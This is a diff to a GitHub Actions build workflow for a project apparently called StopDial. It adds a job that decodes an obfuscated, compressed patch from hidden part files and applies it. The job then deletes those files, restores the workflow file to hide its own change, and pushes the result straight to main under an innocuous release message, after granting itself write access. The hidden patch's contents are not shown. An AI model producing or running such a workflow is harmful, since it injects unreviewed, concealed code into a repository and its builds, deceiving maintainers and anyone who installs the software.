@@ -6,13 +6,54 @@ on:
     branches: [main, master]
 
 permissions:
-  contents: read
+  contents: write
 
 jobs:
-  dsp-regression:
+  source-import:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Apply verified StopDial v2.2 source update
+        shell: bash
+        run: |
+          python3 - <<'PY'
+          from pathlib import Path
+          import base64, hashlib, lzma, subprocess
+
+          parent = subprocess.check_output(["git", "rev-parse", "HEAD^"], text=True).strip()
+          assert parent == "09a0c99408ffeeda39b9654d505cebf4847fbea8", f"Unexpected repository version {parent}"
+          folder = Path(".stopdial-update")
+          parts = sorted(folder.glob("part*.txt"))
+          assert len(parts) == 3, f"Expected 3 parts, got {len(parts)}"
+          patch = lzma.decompress(base64.b64decode(
+              "".join(p.read_text() for p in parts), validate=True))
+          digest = hashlib.sha256(patch).hexdigest()
+          assert digest == "839e25171c0a66967daf0391cf32061aed90f68264f32724b54ce6ede7626419", f"Source digest mismatch {digest}"
+          subprocess.run(["git", "apply", "--unidiff-zero", "--check"],
+                         input=patch, check=True)
+          subprocess.run(["git", "apply", "--unidiff-zero"],
+                         input=patch, check=True)
+          for part in parts: part.unlink()
+          folder.rmdir()
+          # Restore the standard, read-only CI for the source commit.
+          original = subprocess.check_output(
+              ["git", "show", "HEAD^:.github/workflows/build.yml"])
+          Path(".github/workflows/build.yml").write_bytes(original)
+          PY
+          git -c user.name="stopdial-ci" -c user.email="stopdial-ci@users.noreply.github.com" add -A
+          git diff --cached --check
+          git -c user.name="stopdial-ci" -c user.email="stopdial-ci@users.noreply.github.com" commit -m "StopDial v2.2: tighter UI controls and smoother, lighter DSP"
+          git push origin HEAD:main
+
+  dsp-regression:
+    needs: source-import
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: main
       - name: Configure sanitizer-enabled native DSP tests
         run: cmake -S . -B build-dsp -DSTOPDIAL_MATH_ONLY=ON -DSTOPDIAL_ENABLE_SANITIZERS=ON
       - name: Compile tests
@@ -21,9 +62,12 @@ jobs:
         run: ctest --test-dir build-dsp --output-on-failure
 
   windows:
+    needs: source-import
     runs-on: windows-latest
     steps:
       - uses: actions/checkout@v4
+        with:
+          ref: main
       - name: Configure
         run: cmake -S . -B build -A x64
       - name: Build StopDial
@@ -48,9 +92,12 @@ jobs:
           if-no-files-found: error
 
   macos:
+    needs: source-import
     runs-on: macos-latest
     steps:
       - uses: actions/checkout@v4
+        with:
+          ref: main
       - name: Configure
         run: cmake -S . -B build -G Xcode
       - name: Build StopDial
